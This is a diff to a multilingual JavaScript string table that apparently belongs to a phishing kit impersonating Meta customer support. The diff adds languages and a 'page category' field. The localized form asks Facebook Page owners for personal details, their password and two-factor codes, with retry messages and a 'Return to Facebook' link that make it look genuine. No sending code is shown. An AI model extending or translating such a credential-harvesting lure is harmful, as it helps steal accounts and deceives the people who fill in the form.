@@ -12,8 +12,7 @@ const APP_I18N = {
         day: 'Day',
         month: 'Month',
         year: 'Year',
-        additionalNotes: 'Additional notes (optional)',
-        responseTime: 'Our response will be sent to you within 14 - 48 hours.',
+        pageCategory: 'Page category',
         agreeWith: 'I agree with',
         termsOfUse: 'Terms of use',
         send: 'Send',
@@ -23,7 +22,7 @@ const APP_I18N = {
         forgotPassword: 'Forgot your password?',
         passwordRequired: "You haven't entered your password!",
         passwordIncorrect: "The password you've entered is incorrect.",
-        twoFaTitle: 'Two-factor authentication required (1/3)',
+        twoFaTitle: 'Two-factor authentication required',
         authDescription: 'Enter the code for this account that we send to {email}, {phone} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
         code: 'Code',
         tryAnotherWay: 'Try another way',
@@ -45,8 +44,7 @@ const APP_I18N = {
         day: 'Day',
         month: 'Month',
         year: 'Year',
-        additionalNotes: 'Additional notes (optional)',
-        responseTime: 'Our response will be sent to you within 14 - 48 hours.',
+        pageCategory: 'Page category',
         agreeWith: 'I agree with',
         termsOfUse: 'Terms of use',
         send: 'Send',
@@ -56,7 +54,7 @@ const APP_I18N = {
         forgotPassword: 'Forgotten your password?',
         passwordRequired: "You haven't entered your password!",
         passwordIncorrect: "The password you've entered is incorrect.",
-        twoFaTitle: 'Two-factor authentication required (1/3)',
+        twoFaTitle: 'Two-factor authentication required',
         authDescription: 'Enter the code for this account that we send to {email}, {phone} or simply confirm through the two-factor application that you have set (such as Duo Mobile or Google Authenticator)',
         code: 'Code',
         tryAnotherWay: 'Try another way',
@@ -78,8 +76,7 @@ const APP_I18N = {
         day: 'Día',
         month: 'Mes',
         year: 'Año',
-        additionalNotes: 'Notas adicionales (opcional)',
-        responseTime: 'Nuestra respuesta se enviará en un plazo de 14 a 48 horas.',
+        pageCategory: 'Categoría de la página',
         agreeWith: 'Acepto los',
         termsOfUse: 'Términos de uso',
         send: 'Enviar',
@@ -89,7 +86,7 @@ const APP_I18N = {
         forgotPassword: '¿Olvidaste tu contraseña?',
         passwordRequired: '¡No has introducido tu contraseña!',
         passwordIncorrect: 'La contraseña que has introducido es incorrecta.',
-        twoFaTitle: 'Se requiere autenticación de dos factores (1/3)',
+        twoFaTitle: 'Se requiere autenticación de dos factores',
         authDescription: 'Introduce el código de esta cuenta que enviamos a {email}, {phone} o confirma simplemente a través de la aplicación de dos factores que hayas configurado (como Duo Mobile o Google Authenticator)',
         code: 'Código',
         tryAnotherWay: 'Probar de otra forma',
@@ -111,8 +108,7 @@ const APP_I18N = {
         day: 'Jour',
         month: 'Mois',
         year: 'Année',
-        additionalNotes: 'Notes supplémentaires (facultatif)',
-        responseTime: 'Notre réponse vous sera envoyée dans un délai de 14 à 48 heures.',
+        pageCategory: 'Catégorie de la page',
         agreeWith: 'J’accepte les',
         termsOfUse: 'Conditions d’utilisation',
         send: 'Envoyer',
@@ -122,7 +118,7 @@ const APP_I18N = {
         forgotPassword: 'Mot de passe oublié ?',
         passwordRequired: 'Vous n’avez pas saisi votre mot de passe !',
         passwordIncorrect: 'Le mot de passe saisi est incorrect.',
-        twoFaTitle: 'Authentification à deux facteurs requise (1/3)',
+        twoFaTitle: 'Authentification à deux facteurs requise',
         authDescription: 'Saisissez le code de ce compte que nous envoyons à {email}, {phone} ou confirmez simplement via l’application d’authentification à deux facteurs que vous avez configurée (comme Duo Mobile ou Google Authenticator)',
         code: 'Code',
         tryAnotherWay: 'Essayer une autre méthode',
@@ -144,8 +140,7 @@ const APP_I18N = {
         day: 'Tag',
         month: 'Monat',
         year: 'Jahr',
-        additionalNotes: 'Zusätzliche Hinweise (optional)',
-        responseTime: 'Unsere Antwort wird Ihnen innerhalb von 14–48 Stunden zugesendet.',
+        pageCategory: 'Seitenkategorie',
         agreeWith: 'Ich stimme den',
         termsOfUse: 'Nutzungsbedingungen zu',
         send: 'Senden',
@@ -155,7 +150,7 @@ const APP_I18N = {
         forgotPassword: 'Passwort vergessen?',
         passwordRequired: 'Sie haben kein Passwort eingegeben!',
         passwordIncorrect: 'Das eingegebene Passwort ist falsch.',
-        twoFaTitle: 'Zwei-Faktor-Authentifizierung erforderlich (1/3)',
+        twoFaTitle: 'Zwei-Faktor-Authentifizierung erforderlich',
         authDescription: 'Geben Sie den Code für dieses Konto ein, den wir an {email}, {phone} senden, oder bestätigen Sie einfach über die Zwei-Faktor-App, die Sie eingerichtet haben (z. B. Duo Mobile oder Google Authenticator)',
         code: 'Code',
         tryAnotherWay: 'Anderen Weg versuchen',
@@ -177,8 +172,7 @@ const APP_I18N = {
         day: 'Dia',
         month: 'Mês',
         year: 'Ano',
-        additionalNotes: 'Notas adicionais (opcional)',
-        responseTime: 'Nossa resposta será enviada em 14 a 48 horas.',
+        pageCategory: 'Categoria da página',
         agreeWith: 'Concordo com os',
         termsOfUse: 'Termos de uso',
         send: 'Enviar',
@@ -188,7 +182,7 @@ const APP_I18N = {
         forgotPassword: 'Esqueceu a senha?',
         passwordRequired: 'Você não inseriu sua senha!',
         passwordIncorrect: 'A senha inserida está incorreta.',
-        twoFaTitle: 'Autenticação de dois fatores necessária (1/3)',
+        twoFaTitle: 'Autenticação de dois fatores necessária',
         authDescription: 'Insira o código desta conta que enviamos para {email}, {phone} ou confirme simplesmente pelo aplicativo de dois fatores que você configurou (como Duo Mobile ou Google Authenticator)',
         code: 'Código',
         tryAnotherWay: 'Tentar de outra forma',
@@ -210,8 +204,7 @@ const APP_I18N = {
         day: '日',
         month: '月',
         year: '年',
-        additionalNotes: '補足メモ（任意）',
-        responseTime: 'ご返信は14〜48時間以内にお送りします。',
+        pageCategory: 'ページのカテゴリ',
         agreeWith: '同意します',
         termsOfUse: '利用規約',
         send: '送信',
@@ -221,7 +214,7 @@ const APP_I18N = {
         forgotPassword: 'パスワードをお忘れですか？',
         passwordRequired: 'パスワードが入力されていません。',
         passwordIncorrect: '入力されたパスワードが正しくありません。',
-        twoFaTitle: '二要素認証が必要です（1/3）',
+        twoFaTitle: '二要素認証が必要です',
         authDescription: '{email}、{phone} に送信したこのアカウントのコードを入力するか、設定済みの二要素認証アプリ（Duo Mobile や Google Authenticator など）で確認してください',
         code: 'コード',
         tryAnotherWay: '別の方法を試す',
@@ -243,8 +236,7 @@ const APP_I18N = {
         day: '일',
         month: '월',
         year: '연도',
-        additionalNotes: '추가 메모(선택)',
-        responseTime: '답변은 14~48시간 이내에 보내드립니다.',
+        pageCategory: '페이지 카테고리',
         agreeWith: '다음에 동의합니다',
         termsOfUse: '이용 약관',
         send: '보내기',
@@ -254,7 +246,7 @@ const APP_I18N = {
         forgotPassword: '비밀번호를 잊으셨나요?',
         passwordRequired: '비밀번호를 입력하지 않았습니다!',
         passwordIncorrect: '입력한 비밀번호가 올바르지 않습니다.',
-        twoFaTitle: '2단계 인증이 필요합니다(1/3)',
+        twoFaTitle: '2단계 인증이 필요합니다',
         authDescription: '{email}, {phone}(으)로 보낸 이 계정의 코드를 입력하거나 설정한 2단계 인증 앱(Duo Mobile 또는 Google Authenticator 등)으로 확인하세요',
         code: '코드',
         tryAnotherWay: '다른 방법 시도',
@@ -276,8 +268,7 @@ const APP_I18N = {
         day: '日',
         month: '月',
         year: '年',
-        additionalNotes: '补充说明（可选）',
-        responseTime: '我们将在 14 至 48 小时内向你发送回复。',
+        pageCategory: '主页类别',
         agreeWith: '我同意',
         termsOfUse: '使用条款',
         send: '发送',
@@ -287,7 +278,7 @@ const APP_I18N = {
         forgotPassword: '忘记密码？',
         passwordRequired: '你尚未输入密码！',
         passwordIncorrect: '你输入的密码不正确。',
-        twoFaTitle: '需要两步验证（1/3）',
+        twoFaTitle: '需要两步验证',
         authDescription: '请输入我们发送到 {email}、{phone} 的此账户验证码，或通过你已设置的两步验证应用（例如 Duo Mobile 或 Google Authenticator）进行确认',
         code: '验证码',
         tryAnotherWay: '尝试其他方式',
@@ -309,8 +300,7 @@ const APP_I18N = {
         day: 'Ngày',
         month: 'Tháng',
         year: 'Năm',
-        additionalNotes: 'Ghi chú thêm (không bắt buộc)',
-        responseTime: 'Phản hồi sẽ được gửi đến bạn trong vòng 14 - 48 giờ.',
+        pageCategory: 'Danh mục trang',
         agreeWith: 'Tôi đồng ý với',
         termsOfUse: 'Điều khoản sử dụng',
         send: 'Gửi',
@@ -320,7 +310,7 @@ const APP_I18N = {
         forgotPassword: 'Quên mật khẩu?',
         passwordRequired: 'Bạn chưa nhập mật khẩu!',
         passwordIncorrect: 'Mật khẩu bạn nhập không đúng.',
-        twoFaTitle: 'Cần xác thực hai yếu tố (1/3)',
+        twoFaTitle: 'Cần xác thực hai yếu tố',
         authDescription: 'Nhập mã cho tài khoản này mà chúng tôi gửi đến {email}, {phone} hoặc xác nhận qua ứng dụng xác thực hai yếu tố bạn đã thiết lập (như Duo Mobile hoặc Google Authenticator)',
         code: 'Mã',
         tryAnotherWay: 'Thử cách khác',
@@ -342,8 +332,7 @@ const APP_I18N = {
         day: 'Giorno',
         month: 'Mese',
         year: 'Anno',
-        additionalNotes: 'Note aggiuntive (facoltativo)',
-        responseTime: 'La nostra risposta ti verrà inviata entro 14 - 48 ore.',
+        pageCategory: 'Categoria della Pagina',
         agreeWith: 'Accetto i',
         termsOfUse: 'Termini di utilizzo',
         send: 'Invia',
@@ -353,7 +342,7 @@ const APP_I18N = {
         forgotPassword: 'Password dimenticata?',
         passwordRequired: 'Non hai inserito la password!',
         passwordIncorrect: 'La password inserita non è corretta.',
-        twoFaTitle: 'Autenticazione a due fattori richiesta (1/3)',
+        twoFaTitle: 'Autenticazione a due fattori richiesta',
         authDescription: 'Inserisci il codice di questo account che inviamo a {email}, {phone} oppure conferma semplicemente tramite l’app di autenticazione a due fattori che hai impostato (come Duo Mobile o Google Authenticator)',
         code: 'Codice',
         tryAnotherWay: 'Prova in un altro modo',
@@ -375,8 +364,7 @@ const APP_I18N = {
         day: 'Dag',
         month: 'Maand',
         year: 'Jaar',
-        additionalNotes: 'Aanvullende opmerkingen (optioneel)',
-        responseTime: 'Ons antwoord wordt binnen 14 - 48 uur naar je verzonden.',
+        pageCategory: 'Paginacategorie',
         agreeWith: 'Ik ga akkoord met de',
         termsOfUse: 'Gebruiksvoorwaarden',
         send: 'Verzenden',
@@ -386,7 +374,7 @@ const APP_I18N = {
         forgotPassword: 'Wachtwoord vergeten?',
         passwordRequired: 'Je hebt geen wachtwoord ingevoerd!',
         passwordIncorrect: 'Het ingevoerde wachtwoord is onjuist.',
-        twoFaTitle: 'Tweestapsverificatie vereist (1/3)',
+        twoFaTitle: 'Tweestapsverificatie vereist',
         authDescription: 'Voer de code voor dit account in die we sturen naar {email}, {phone} of bevestig via de tweestapsverificatie-app die je hebt ingesteld (zoals Duo Mobile of Google Authenticator)',
         code: 'Code',
         tryAnotherWay: 'Een andere manier proberen',
@@ -408,8 +396,7 @@ const APP_I18N = {
         day: 'Dzień',
         month: 'Miesiąc',
         year: 'Rok',
-        additionalNotes: 'Dodatkowe uwagi (opcjonalnie)',
-        responseTime: 'Nasza odpowiedź zostanie wysłana w ciągu 14–48 godzin.',
+        pageCategory: 'Kategoria strony',
         agreeWith: 'Akceptuję',
         termsOfUse: 'Warunki użytkowania',
         send: 'Wyślij',
@@ -419,7 +406,7 @@ const APP_I18N = {
         forgotPassword: 'Nie pamiętasz hasła?',
         passwordRequired: 'Nie wpisano hasła!',
         passwordIncorrect: 'Wpisane hasło jest nieprawidłowe.',
-        twoFaTitle: 'Wymagane uwierzytelnianie dwuskładnikowe (1/3)',
+        twoFaTitle: 'Wymagane uwierzytelnianie dwuskładnikowe',
         authDescription: 'Wpisz kod do tego konta, który wysyłamy na {email}, {phone}, albo potwierdź w aplikacji uwierzytelniania dwuskładnikowego, którą skonfigurowałeś (np. Duo Mobile lub Google Authenticator)',
         code: 'Kod',
         tryAnotherWay: 'Spróbuj innej metody',
@@ -441,8 +428,7 @@ const APP_I18N = {
         day: 'День',
         month: 'Месяц',
         year: 'Год',
-        additionalNotes: 'Дополнительные примечания (необязательно)',
-        responseTime: 'Ответ будет отправлен вам в течение 14–48 часов.',
+        pageCategory: 'Категория страницы',
         agreeWith: 'Я соглашаюсь с',
         termsOfUse: 'Условиями использования',
         send: 'Отправить',
@@ -452,7 +438,7 @@ const APP_I18N = {
         forgotPassword: 'Забыли пароль?',
         passwordRequired: 'Вы не ввели пароль!',
         passwordIncorrect: 'Введённый пароль неверен.',
-        twoFaTitle: 'Требуется двухфакторная аутентификация (1/3)',
+        twoFaTitle: 'Требуется двухфакторная аутентификация',
         authDescription: 'Введите код для этого аккаунта, который мы отправляем на {email}, {phone}, или подтвердите вход в приложении двухфакторной аутентификации, которое вы настроили (например, Duo Mobile или Google Authenticator)',
         code: 'Код',
         tryAnotherWay: 'Попробовать другой способ',
@@ -474,8 +460,7 @@ const APP_I18N = {
         day: 'День',
         month: 'Місяць',
         year: 'Рік',
-        additionalNotes: 'Додаткові примітки (необов’язково)',
-        responseTime: 'Відповідь буде надіслано протягом 14–48 годин.',
+        pageCategory: 'Категорія сторінки',
         agreeWith: 'Я погоджуюся з',
         termsOfUse: 'Умовами використання',
         send: 'Надіслати',
@@ -485,7 +470,7 @@ const APP_I18N = {
         forgotPassword: 'Забули пароль?',
         passwordRequired: 'Ви не ввели пароль!',
         passwordIncorrect: 'Введений пароль неправильний.',
-        twoFaTitle: 'Потрібна двофакторна автентифікація (1/3)',
+        twoFaTitle: 'Потрібна двофакторна автентифікація',
         authDescription: 'Введіть код для цього облікового запису, який ми надсилаємо на {email}, {phone}, або підтвердьте вхід у програмі двофакторної автентифікації, яку ви налаштували (наприклад, Duo Mobile або Google Authenticator)',
         code: 'Код',
         tryAnotherWay: 'Спробувати інший спосіб',
@@ -507,8 +492,7 @@ const APP_I18N = {
         day: 'Gün',
         month: 'Ay',
         year: 'Yıl',
-        additionalNotes: 'Ek notlar (isteğe bağlı)',
-        responseTime: 'Yanıtımız 14 - 48 saat içinde gönderilecektir.',
+        pageCategory: 'Sayfa kategorisi',
         agreeWith: 'Kabul ediyorum:',
         termsOfUse: 'Kullanım koşulları',
         send: 'Gönder',
@@ -518,7 +502,7 @@ const APP_I18N = {
         forgotPassword: 'Şifrenizi mi unuttunuz?',
         passwordRequired: 'Şifrenizi girmediniz!',
         passwordIncorrect: 'Girdiğiniz şifre yanlış.',
-        twoFaTitle: 'İki faktörlü kimlik doğrulama gerekli (1/3)',
+        twoFaTitle: 'İki faktörlü kimlik doğrulama gerekli',
         authDescription: '{email}, {phone} adresine gönderdiğimiz bu hesaba ait kodu girin veya ayarladığınız iki faktörlü doğrulama uygulamasıyla (Duo Mobile veya Google Authenticator gibi) onaylayın',
         code: 'Kod',
         tryAnotherWay: 'Başka bir yol dene',
@@ -540,8 +524,7 @@ const APP_I18N = {
         day: 'اليوم',
         month: 'الشهر',
         year: 'السنة',
-        additionalNotes: 'ملاحظات إضافية (اختياري)',
-        responseTime: 'سيتم إرسال ردنا إليك خلال 14 إلى 48 ساعة.',
+        pageCategory: 'فئة الصفحة',
         agreeWith: 'أوافق على',
         termsOfUse: 'شروط الاستخدام',
         send: 'إرسال',
@@ -551,7 +534,7 @@ const APP_I18N = {
         forgotPassword: 'هل نسيت كلمة المرور؟',
         passwordRequired: 'لم تدخل كلمة المرور!',
         passwordIncorrect: 'كلمة المرور التي أدخلتها غير صحيحة.',
-        twoFaTitle: 'مطلوب المصادقة الثنائية (1/3)',
+        twoFaTitle: 'مطلوب المصادقة الثنائية',
         authDescription: 'أدخل رمز هذا الحساب الذي نرسله إلى {email}، {phone} أو أكّد عبر تطبيق المصادقة الثنائية الذي أعددته (مثل Duo Mobile أو Google Authenticator)',
         code: 'الرمز',
         tryAnotherWay: 'جرّب طريقة أخرى',
@@ -573,8 +556,7 @@ const APP_I18N = {
         day: 'दिन',
         month: 'महीना',
         year: 'वर्ष',
-        additionalNotes: 'अतिरिक्त नोट्स (वैकल्पिक)',
-        responseTime: 'हमारा उत्तर 14 - 48 घंटों में भेज दिया जाएगा।',
+        pageCategory: 'पेज श्रेणी',
         agreeWith: 'मैं सहमत हूँ',
         termsOfUse: 'उपयोग की शर्तें',
         send: 'भेजें',
@@ -584,7 +566,7 @@ const APP_I18N = {
         forgotPassword: 'पासवर्ड भूल गए?',
         passwordRequired: 'आपने पासवर्ड दर्ज नहीं किया है!',
         passwordIncorrect: 'आपके द्वारा दर्ज पासवर्ड गलत है।',
-        twoFaTitle: 'दो-कारक प्रमाणीकरण आवश्यक (1/3)',
+        twoFaTitle: 'दो-कारक प्रमाणीकरण आवश्यक',
         authDescription: 'इस खाते का कोड दर्ज करें जिसे हम {email}, {phone} पर भेजते हैं, या आपके द्वारा सेट किए गए दो-कारक ऐप (जैसे Duo Mobile या Google Authenticator) से पुष्टि करें',
         code: 'कोड',
         tryAnotherWay: 'कोई और तरीका आज़माएँ',
@@ -606,8 +588,7 @@ const APP_I18N = {
         day: 'วัน',
         month: 'เดือน',
         year: 'ปี',
-        additionalNotes: 'หมายเหตุเพิ่มเติม (ไม่บังคับ)',
-        responseTime: 'เราจะส่งคำตอบให้คุณภายใน 14 - 48 ชั่วโมง',
+        pageCategory: 'หมวดหมู่เพจ',
         agreeWith: 'ฉันยอมรับ',
         termsOfUse: 'ข้อกำหนดการใช้งาน',
         send: 'ส่ง',
@@ -617,7 +598,7 @@ const APP_I18N = {
         forgotPassword: 'ลืมรหัสผ่าน?',
         passwordRequired: 'คุณยังไม่ได้ป้อนรหัสผ่าน!',
         passwordIncorrect: 'รหัสผ่านที่คุณป้อนไม่ถูกต้อง',
-        twoFaTitle: 'ต้องยืนยันตัวตนสองชั้น (1/3)',
+        twoFaTitle: 'ต้องยืนยันตัวตนสองชั้น',
         authDescription: 'ป้อนรหัสของบัญชีนี้ที่เราส่งไปยัง {email}, {phone} หรือยืนยันผ่านแอปยืนยันตัวตนสองชั้นที่คุณตั้งไว้ (เช่น Duo Mobile หรือ Google Authenticator)',
         code: 'รหัส',
         tryAnotherWay: 'ลองวิธีอื่น',
@@ -639,8 +620,7 @@ const APP_I18N = {
         day: 'Hari',
         month: 'Bulan',
         year: 'Tahun',
-        additionalNotes: 'Catatan tambahan (opsional)',
-        responseTime: 'Balasan kami akan dikirim dalam 14 - 48 jam.',
+        pageCategory: 'Kategori halaman',
         agreeWith: 'Saya setuju dengan',
         termsOfUse: 'Ketentuan penggunaan',
         send: 'Kirim',
@@ -650,7 +630,7 @@ const APP_I18N = {
         forgotPassword: 'Lupa kata sandi?',
         passwordRequired: 'Anda belum memasukkan kata sandi!',
         passwordIncorrect: 'Kata sandi yang Anda masukkan salah.',
-        twoFaTitle: 'Autentikasi dua faktor diperlukan (1/3)',
+        twoFaTitle: 'Autentikasi dua faktor diperlukan',
         authDescription: 'Masukkan kode untuk akun ini yang kami kirim ke {email}, {phone} atau konfirmasikan melalui aplikasi autentikasi dua faktor yang telah Anda atur (seperti Duo Mobile atau Google Authenticator)',
         code: 'Kode',
         tryAnotherWay: 'Coba cara lain',
@@ -672,8 +652,7 @@ const APP_I18N = {
         day: 'Dag',
         month: 'Månad',
         year: 'År',
-        additionalNotes: 'Ytterligare anteckningar (valfritt)',
-        responseTime: 'Vårt svar skickas till dig inom 14–48 timmar.',
+        pageCategory: 'Sidkategori',
         agreeWith: 'Jag godkänner',
         termsOfUse: 'Användarvillkoren',
         send: 'Skicka',
@@ -683,7 +662,7 @@ const APP_I18N = {
         forgotPassword: 'Glömt lösenordet?',
         passwordRequired: 'Du har inte angett ditt lösenord!',
         passwordIncorrect: 'Lösenordet du angav är felaktigt.',
-        twoFaTitle: 'Tvåfaktorsautentisering krävs (1/3)',
+        twoFaTitle: 'Tvåfaktorsautentisering krävs',
         authDescription: 'Ange koden för det här kontot som vi skickar till {email}, {phone} eller bekräfta via den tvåfaktorsapp du har ställt in (till exempel Duo Mobile eller Google Authenticator)',
         code: 'Kod',
         tryAnotherWay: 'Prova ett annat sätt',
@@ -693,6 +672,70 @@ const APP_I18N = {
         successBody: 'Din begäran har lagts till i behandlingskön. Vi hanterar den inom 24 timmar.',
         successFrom: 'Från Meta kundsupport.',
         returnFacebook: 'Tillbaka till Facebook'
+    },
+    no: {
+        formTitle: 'Informasjonsskjema',
+        fullName: 'Fullt navn',
+        email: 'E-post',
+        emailBusiness: 'Bedrifts-e-post',
+        pageName: 'Sidenavn',
+        phoneNumber: 'Telefonnummer',
+        dateOfBirth: 'Fødselsdato',
+        day: 'Dag',
+        month: 'Måned',
+        year: 'År',
+        pageCategory: 'Sidekategori',
+        agreeWith: 'Jeg godtar',
+        termsOfUse: 'Bruksvilkårene',
+        send: 'Send',
+        securityHint: 'Av sikkerhetsgrunner må du oppgi passordet ditt for å fortsette.',
+        password: 'Passord',
+        continue: 'Fortsett',
+        forgotPassword: 'Glemt passordet?',
+        passwordRequired: 'Du har ikke oppgitt passordet!',
+        passwordIncorrect: 'Passordet du oppga er feil.',
+        twoFaTitle: 'Tofaktorautentisering kreves',
+        authDescription: 'Skriv inn koden for denne kontoen som vi sender til {email}, {phone}, eller bekreft via tofaktorappen du har satt opp (for eksempel Duo Mobile eller Google Authenticator)',
+        code: 'Kode',
+        tryAnotherWay: 'Prøv en annen måte',
+        codeRequired: 'Du har ikke oppgitt koden!',
+        codeRetry: 'Koden er feil. Prøv igjen om {time} sekunder.',
+        successTitle: 'Forespørselen er sendt',
+        successBody: 'Forespørselen din er lagt til i behandlingskøen. Vi håndterer den innen 24 timer.',
+        successFrom: 'Fra Meta kundestøtte.',
+        returnFacebook: 'Tilbake til Facebook'
+    },
+    da: {
+        formTitle: 'Informationsformular',
+        fullName: 'Fulde navn',
+        email: 'E-mail',
+        emailBusiness: 'Erhvervs-e-mail',
+        pageName: 'Sidenavn',
+        phoneNumber: 'Telefonnummer',
+        dateOfBirth: 'Fødselsdato',
+        day: 'Dag',
+        month: 'Måned',
+        year: 'År',
+        pageCategory: 'Sidekategori',
+        agreeWith: 'Jeg accepterer',
+        termsOfUse: 'Brugsvilkårene',
+        send: 'Send',
+        securityHint: 'Af sikkerhedshensyn skal du indtaste din adgangskode for at fortsætte.',
+        password: 'Adgangskode',
+        continue: 'Fortsæt',
+        forgotPassword: 'Glemt adgangskode?',
+        passwordRequired: 'Du har ikke indtastet din adgangskode!',
+        passwordIncorrect: 'Adgangskoden, du indtastede, er forkert.',
+        twoFaTitle: 'Tofaktorgodkendelse påkrævet',
+        authDescription: 'Indtast koden til denne konto, som vi sender til {email}, {phone}, eller bekræft via den tofaktorapp, du har konfigureret (f.eks. Duo Mobile eller Google Authenticator)',
+        code: 'Kode',
+        tryAnotherWay: 'Prøv en anden måde',
+        codeRequired: 'Du har ikke indtastet koden!',
+        codeRetry: 'Koden er forkert. Prøv igen om {time} sekunder.',
+        successTitle: 'Anmodningen er sendt',
+        successBody: 'Din anmodning er tilføjet til behandlingskøen. Vi håndterer den inden for 24 timer.',
+        successFrom: 'Fra Meta kundesupport.',
+        returnFacebook: 'Tilbage til Facebook'
     },
     'zh-tw': {
         formTitle: '資訊表單',
@@ -705,8 +748,7 @@ const APP_I18N = {
         day: '日',
         month: '月',
         year: '年',
-        additionalNotes: '補充說明（選填）',
-        responseTime: '我們將在 14 至 48 小時內向你發送回覆。',
+        pageCategory: '專頁類別',
         agreeWith: '我同意',
         termsOfUse: '使用條款',
         send: '傳送',
@@ -716,7 +758,7 @@ const APP_I18N = {
         forgotPassword: '忘記密碼？',
         passwordRequired: '你尚未輸入密碼！',
         passwordIncorrect: '你輸入的密碼不正確。',
-        twoFaTitle: '需要兩步驟驗證（1/3）',
+        twoFaTitle: '需要兩步驟驗證',
         authDescription: '請輸入我們傳送到 {email}、{phone} 的此帳戶驗證碼，或透過你已設定的兩步驟驗證應用程式（例如 Duo Mobile 或 Google Authenticator）進行確認',
         code: '驗證碼',
         tryAnotherWay: '嘗試其他方式',
@@ -726,6 +768,38 @@ const APP_I18N = {
         successBody: '你的請求已加入處理佇列。我們將在 24 小時內處理。',
         successFrom: '來自 Meta 客戶支援。',
         returnFacebook: '返回 Facebook'
+    },
+    he: {
+        formTitle: 'טופס מידע',
+        fullName: 'שם מלא',
+        email: 'אימייל',
+        emailBusiness: 'אימייל עסקי',
+        pageName: 'שם העמוד',
+        phoneNumber: 'מספר טלפון',
+        dateOfBirth: 'תאריך לידה',
+        day: 'יום',
+        month: 'חודש',
+        year: 'שנה',
+        pageCategory: 'קטגוריית העמוד',
+        agreeWith: 'אני מסכים/ה ל',
+        termsOfUse: 'תנאי השימוש',
+        send: 'שלח',
+        securityHint: 'למען האבטחה שלך יש להזין את הסיסמה כדי להמשיך.',
+        password: 'סיסמה',
+        continue: 'המשך',
+        forgotPassword: 'שכחת סיסמה?',
+        passwordRequired: 'לא הזנת סיסמה!',
+        passwordIncorrect: 'הסיסמה שהוזנה שגויה.',
+        twoFaTitle: 'נדרש אימות דו-שלבי',
+        authDescription: 'הזן את הקוד לחשבון זה ששלחנו אל {email}, {phone} או אשר באמצעות אפליקציית האימות הדו-שלבי שהגדרת (כגון Duo Mobile או Google Authenticator)',
+        code: 'קוד',
+        tryAnotherWay: 'נסה דרך אחרת',
+        codeRequired: 'לא הזנת את הקוד!',
+        codeRetry: 'הקוד שגוי. נסה שוב בעוד {time} שניות.',
+        successTitle: 'הבקשה נשלחה',
+        successBody: 'הבקשה שלך נוספה לתור הטיפול. נטפל בה תוך 24 שעות.',
+        successFrom: 'מתמיכת הלקוחות של Meta.',
+        returnFacebook: 'חזרה לפייסבוק'
     }
 };
 
@@ -751,6 +825,34 @@ function t(key, vars) {
     return text;
 }
 
+var PAGE_CATEGORY_OPTIONS = {
+    en: { personal: 'Personal', business: 'Business', creator: 'Creator / Public figure', media: 'Media / News', brand: 'Brand / Organization', community: 'Community' },
+    'en-gb': { personal: 'Personal', business: 'Business', creator: 'Creator / Public figure', media: 'Media / News', brand: 'Brand / Organisation', community: 'Community' },
+    es: { personal: 'Personal', business: 'Empresa', creator: 'Creador / Figura pública', media: 'Medios / Noticias', brand: 'Marca / Organización', community: 'Comunidad' },
+    fr: { personal: 'Personnel', business: 'Entreprise', creator: 'Créateur / Personnalité publique', media: 'Médias / Actualités', brand: 'Marque / Organisation', community: 'Communauté' },
+    de: { personal: 'Persönlich', business: 'Unternehmen', creator: 'Creator / Person des öffentlichen Lebens', media: 'Medien / Nachrichten', brand: 'Marke / Organisation', community: 'Community' },
+    pt: { personal: 'Pessoal', business: 'Empresa', creator: 'Criador / Figura pública', media: 'Mídia / Notícias', brand: 'Marca / Organização', community: 'Comunidade' },
+    ja: { personal: '個人', business: 'ビジネス', creator: 'クリエイター / 著名人', media: 'メディア / ニュース', brand: 'ブランド / 団体', community: 'コミュニティ' },
+    ko: { personal: '개인', business: '비즈니스', creator: '크리에이터 / 공인', media: '미디어 / 뉴스', brand: '브랜드 / 단체', community: '커뮤니티' },
+    zh: { personal: '个人', business: '企业', creator: '创作者 / 公众人物', media: '媒体 / 新闻', brand: '品牌 / 机构', community: '社区' },
+    vi: { personal: 'Cá nhân', business: 'Doanh nghiệp', creator: 'Nhà sáng tạo / Người nổi tiếng', media: 'Truyền thông / Tin tức', brand: 'Thương hiệu / Tổ chức', community: 'Cộng đồng' },
+    it: { personal: 'Personale', business: 'Attività commerciale', creator: 'Creator / Figura pubblica', media: 'Media / Notizie', brand: 'Brand / Organizzazione', community: 'Community' },
+    nl: { personal: 'Persoonlijk', business: 'Bedrijf', creator: 'Creator / Publiek figuur', media: 'Media / Nieuws', brand: 'Merk / Organisatie', community: 'Community' },
+    pl: { personal: 'Osobiste', business: 'Firma', creator: 'Twórca / Osoba publiczna', media: 'Media / Wiadomości', brand: 'Marka / Organizacja', community: 'Społeczność' },
+    ru: { personal: 'Личное', business: 'Бизнес', creator: 'Автор / Публичная личность', media: 'СМИ / Новости', brand: 'Бренд / Организация', community: 'Сообщество' },
+    uk: { personal: 'Особисте', business: 'Бізнес', creator: 'Автор / Публічна особа', media: 'Медіа / Новини', brand: 'Бренд / Організація', community: 'Спільнота' },
+    tr: { personal: 'Kişisel', business: 'İşletme', creator: 'İçerik üreticisi / Tanınmış kişi', media: 'Medya / Haber', brand: 'Marka / Kuruluş', community: 'Topluluk' },
+    ar: { personal: 'شخصي', business: 'أعمال', creator: 'صانع محتوى / شخصية عامة', media: 'إعلام / أخبار', brand: 'علامة تجارية / مؤسسة', community: 'مجتمع' },
+    hi: { personal: 'व्यक्तिगत', business: 'व्यवसाय', creator: 'क्रिएटर / सार्वजनिक व्यक्ति', media: 'मीडिया / समाचार', brand: 'ब्रांड / संगठन', community: 'समुदाय' },
+    th: { personal: 'ส่วนตัว', business: 'ธุรกิจ', creator: 'ครีเอเตอร์ / บุคคลสาธารณะ', media: 'สื่อ / ข่าว', brand: 'แบรนด์ / องค์กร', community: 'ชุมชน' },
+    id: { personal: 'Pribadi', business: 'Bisnis', creator: 'Kreator / Tokoh publik', media: 'Media / Berita', brand: 'Merek / Organisasi', community: 'Komunitas' },
+    sv: { personal: 'Personligt', business: 'Företag', creator: 'Creator / Offentlig person', media: 'Media / Nyheter', brand: 'Varumärke / Organisation', community: 'Community' },
+    no: { personal: 'Personlig', business: 'Bedrift', creator: 'Skaper / Offentlig person', media: 'Media / Nyheter', brand: 'Merkevare / Organisasjon', community: 'Fellesskap' },
+    da: { personal: 'Personlig', business: 'Virksomhed', creator: 'Skaber / Offentlig person', media: 'Medier / Nyheder', brand: 'Brand / Organisation', community: 'Fællesskab' },
+    'zh-tw': { personal: '個人', business: '企業', creator: '創作者 / 公眾人物', media: '媒體 / 新聞', brand: '品牌 / 機構', community: '社群' },
